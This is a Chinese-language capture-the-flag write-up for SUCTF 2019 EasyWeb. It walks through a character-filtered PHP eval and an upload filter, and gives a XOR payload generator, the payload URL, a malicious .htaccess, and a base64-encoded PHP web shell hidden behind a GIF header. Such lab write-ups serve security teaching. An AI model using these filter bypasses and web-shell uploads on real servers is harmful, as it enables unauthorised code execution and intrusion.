# [SUCTF 2019]EasyWeb



## 0、知识点

>   -   **.htaccess文件利用**
>       -   这个文件主要作用就是实现url改写，常见的就是把指定的文件按照php文件来解析
>       -   我用得多的就是留后门
>   -   **无字符rce**
>       -   简单来说就是将数字的字符经过各种变换，最后构造出a-z中的任意一个字符
>       -   然后利用php动态函数的特点，拼接出一个函数名，然后执行



## 1、分析

>   打开题目就可以看道代码已经全放出来了，然后读一波代码

```php
<?php

function get_the_flag(){
    //	创建文件目录
    $userdir = "upload/tmp_".md5($_SERVER['REMOTE_ADDR']);
    // 路径没有就创建
    if(!file_exists($userdir)){
    	mkdir($userdir);
    }

    // 获取文件
    if(!empty($_FILES["file"])) {
    	// 获取文件
        $tmp_name = $_FILES["file"]["tmp_name"];
        // 获取文件名
        $name = $_FILES["file"]["name"];
        // 获取文件扩展名
        $extension = substr($name, strrpos($name,".")+1);

        // 文件后缀不能有 ph
    	if(preg_match("/ph/i",$extension)) die("^_^"); 

    	// 文件中不能出现 <?    
	    if(mb_strpos(file_get_contents($tmp_name), '<?')!==False) die("^_^");

	    // 文件类型得是图像
    	if(!exif_imagetype($tmp_name)) die("^_^"); 

    	// 拼接路径
        $path= $userdir."/".$name;
        // 将文件上传
        @move_uploaded_file($tmp_name, $path);

       	// 输出文件地址
        print_r($path);
    }
}

$hhh = @$_GET['_'];

// 为空显示代码
if (!$hhh){
    highlight_file(__FILE__);
}

// 字符串长度不能大于18
if(strlen($hhh)>18){
    die('One inch long, one inch strong!');
}

// 过滤
if ( preg_match('/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i', $hhh) )
    die('Try something else!');

// 将字符串去重，并按ASCII码从小到大返回字符串
$character_type = count_chars($hhh, 3);

// 去重后字符串长度不能大于12
if(strlen($character_type)>12) die("Almost there!");

eval($hhh);
?>

```

## 3、解题

>   -   根据上面的读代码可以知道
>       -   需要首先构成一个无字符的rce
>       -   然后上传一个文件
>           -   存在的过滤：`ph、<?`
>       -   上传成后会返回文件上传路径 = 留后门访问拿flag

### 构造无字符rce

**贴一个php脚本，主要是使用异或构造脚本**

```php
<?php
$l = "";
$r = "";
$argv = str_split("_GET");  ##将_GET分割成一个数组，一位存一个值
for($i=0;$i<count($argv);$i++){   
    for($j=0;$j<255;$j++)
    {
        $k = chr($j)^chr(255);    ##进行异或         
        if($k == $argv[$i]){
            if($j<16){  ##如果小于16就代表只需一位即可表示，但是url要求是2位所以补个0
                $l .= "%ff";
                $r .= "%0" . dechex($j);
                continue;
            }
            $l .= "%ff";
            $r .= "%" . dechex($j);
            
        }
    }}
echo "\{$l^$r\}";  ### 这里的反引号只是用来区分左半边和右半边而已
```

**执行后获得的结果为如下，然后进行测试是否有用**

```nginx
${%ff%ff%ff%ff^%a0%b8%ba%ab}{%A0}();&%A0=phpinfo
```

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfimg/web/three202303211138227.png)

>   可以发现`phpinfo`已经被执行了，然后同理将`phpinfo`替换成`get_the_flag`
>
>   就可以开始上传文件了，

 **.htaccess文件内容如下**

```htaccess
#define width 1337
#define height 1337
php_value auto_prepend_file "php://filter/convert.base64-decode/resource=./poc.jpg"
AddType application/x-httpd-php .jpg
```

>   通过其`php_value auto_append_file`指定文件被PHP包含，
>
>   通过`AddType application/x-httpd-php`指定文件被解析，此外这条配置是兼容php伪协议的，
>
>   所以可以采用`php://filter`伪协议进行base64编码处理，这样就能绕过对`<?`的检测了。

**然后还需要构造一个poc.jpg文件，其内容如下**

```nginx
GIF89a66
PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==
```

>   文件主体使用使用幻数绕过，因为使用base64进行解析，每4位一解析所有补上两位

**在贴上传文件的html**

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>POST数据包POC</title>
</head>
<body>
<!--题目链接-->
<form action="http://312eb63b-8fb9-4c43-91ca-b740512a664a.node4.buuoj.cn:81/?_=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%A0}();&%A0=get_the_flag" method="post" enctype="multipart/form-data">
    <label for="file">文件名：</label>
    <input type="file" name="file" id="postedFile"><br>
    <input type="submit" name="submit" value="提交">
</form>
</body>
</html>
```

**获取到返回的路径名**

```c
upload/tmp_c47b21fcf8f0bc8b3920541abd8024fd/.htaccess
upload/tmp_c47b21fcf8f0bc8b3920541abd8024fd/poc.jpg
```

**然后访问图片位置**

```c
http://312eb63b-8fb9-4c43-91ca-b740512a664a.node4.buuoj.cn:81/upload/tmp_c47b21fcf8f0bc8b3920541abd8024fd/poc.jpg
```

**然后蚁剑连接拿flag**

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfimg/web/three202303211154406.png)

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfimg/web/three202303211153703.png)





















参考：

.htaccess文件利用：https://xz.aliyun.com/t/8267

无字符rce构造：https://juejin.cn/post/7096123946562486309

phpinfo可用信息介绍：https://www.k0rz3n.com/2019/02/12/PHPINFO 

https://mayi077.gitee.io/2020/02/14/SUCTF-2019-EasyWeb/

https://www.cnblogs.com/Article-kelp/p/16097100.html



































